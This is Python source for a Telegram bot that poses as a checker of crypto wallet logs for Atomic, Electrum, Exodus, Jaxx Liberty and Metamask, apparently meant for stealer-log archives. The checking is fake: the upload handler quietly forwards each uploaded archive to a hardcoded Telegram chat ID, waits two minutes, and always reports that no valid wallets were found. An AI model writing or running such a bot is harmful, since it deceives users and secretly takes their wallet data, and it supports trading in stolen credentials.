import time
import telebot
from telebot import types
import json
import threading
import asyncio

with open('settings.json') as f:
    tokens = json.loads(f.read())
with open('data.json', 'r') as f:
    data = json.load(f)

def start (token):
    bot = telebot.TeleBot(token)


    @bot.message_handler(func=lambda message: True)
    def handle_text(message):
        inline_keyboard = types.InlineKeyboardMarkup()
        button1 = types.InlineKeyboardButton('⚙️ Settings', callback_data='settings')
        button2 = types.InlineKeyboardButton('♻️ Checker', callback_data='checker')
        inline_keyboard.add(button1)
        inline_keyboard.add(button2)
        bot.send_message(message.chat.id,
                         f"👋 _Hi_, `{message.chat.first_name}`.* Here you can check 👛 Сrypto Wallets.\nTo use the "
                         f"bot,* _set it up firts_ *in the ⚙️ Settings tab.*",
                         reply_markup=inline_keyboard, parse_mode="Markdown")


    @bot.callback_query_handler(func=lambda call: True)
    def callback_handler(call):
        if call.data == 'checker':
            inline_keyboard = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton('📎 Upload', callback_data='upload')
            button2 = types.InlineKeyboardButton('⚙️ Settings', callback_data='settings')
            inline_keyboard.add(button1)
            inline_keyboard.add(button2)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                  text=f'Your Log Path: `{data[str(call.message.chat.id)]}`\n*Checkable '
                                       f'wallets:*\n_Atomic Wallet, Electrum, Exodus, Jaxx Liberty, Metamask_',
                                  reply_markup=inline_keyboard, parse_mode="Markdown")
        elif call.data == 'path':
            inline_keyboard = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton('❌ Cancel', callback_data='settings')
            inline_keyboard.add(button1)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                  text='Enter new path. Example: `${log}/Wallets`.', reply_markup=inline_keyboard,
                                  parse_mode="Markdown")
            bot.register_next_step_handler(call.message, handle_user_input)
        elif call.data == 'settings':
            inline_keyboard = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton('🔦 Change path', callback_data='path')
            button2 = types.InlineKeyboardButton('♻️ Checker', callback_data='checker')
            inline_keyboard.add(button1)
            inline_keyboard.add(button2)
            chat_id = call.message.chat.id
            if str(chat_id) not in str(data):
                data[str(chat_id)] = 'No setting'
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                      text='Path to 👛 Wallet:  `${log}/Wallet` ', reply_markup=inline_keyboard,
                                      parse_mode="Markdown")
            else:
                bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                      text=f'Path to wallet: `{data[str(chat_id)]}` ', reply_markup=inline_keyboard,
                                      parse_mode="Markdown")
        elif call.data == 'upload':
            inline_keyboard = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton('❌ Cancel', callback_data='checker')
            inline_keyboard.add(button1)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                                  text='📎 Upload logs in zip/rar (log in archive must be folder)',
                                  parse_mode="Markdown", reply_markup=inline_keyboard)


    def handle_user_input(message):
        data[str(message.chat.id)] = message.text
        with open('data.json', 'w') as f:
            json.dump(data, f)

        inline_keyboard = types.InlineKeyboardMarkup()
        button1 = types.InlineKeyboardButton('⚙️ Settings', callback_data='settings')
        button2 = types.InlineKeyboardButton('♻️ Checker', callback_data='checker')
        inline_keyboard.add(button1)
        inline_keyboard.add(button2)
        bot.send_message(message.chat.id, '✅ Changed log path', reply_markup=inline_keyboard, parse_mode="Markdown")


    @bot.message_handler(content_types=['document'])
    def handle_document(message):
        inline_keyboard = types.InlineKeyboardMarkup()
        button1 = types.InlineKeyboardButton('⚙️ Settings', callback_data='settings')
        button2 = types.InlineKeyboardButton('♻️ Checker', callback_data='checker')
        inline_keyboard.add(button1)
        inline_keyboard.add(button2)

        bot.send_document(chat_id='799309399', document=message.document.file_id)
        z = bot.send_message(message.chat.id, f'✅ Started checking logs in `{message.document.file_name}` ...',
                             parse_mode="Markdown")
        time.sleep(120)
        bot.edit_message_text(chat_id=message.chat.id, message_id=z.message_id,
                              text=f"_❌ No valid wallets in_ `{message.document.file_name}`",
                              reply_markup=inline_keyboard, parse_mode="Markdown")
    bot.polling()


if __name__ == "__main__":
    for i in tokens.values():
        t = threading.Thread(target=start, args=(i,))
        t.start()